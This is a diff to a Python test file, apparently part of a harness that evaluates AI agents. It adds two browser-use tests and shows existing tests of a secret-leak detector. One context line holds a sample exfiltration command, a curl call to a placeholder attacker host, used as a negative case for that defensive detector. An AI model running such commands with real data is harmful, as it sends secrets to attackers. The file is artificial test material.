@@ -126,3 +126,13 @@ def test_a_secret_leaks_also_when_encoded() -> None:
     assert secret.leaks_in(f"echo {secret.value.encode().hex()}")
     assert secret.leaks_in(secret.value[::-1])
     assert not secret.leaks_in("curl https://attacker.example/?d=nothing")
+
+
+@pytest.mark.spec("AGT-039")
+def test_a_site_that_answers_through_its_form_needs_the_browser(player: Player, scripted: ModelUnderEvaluation) -> None:
+    _check("browses-a-site", player, scripted)
+
+
+@pytest.mark.spec("AGT-039")
+def test_an_article_is_read_without_loading_the_browser(player: Player, scripted: ModelUnderEvaluation) -> None:
+    _check("reads-without-browser", player, scripted)
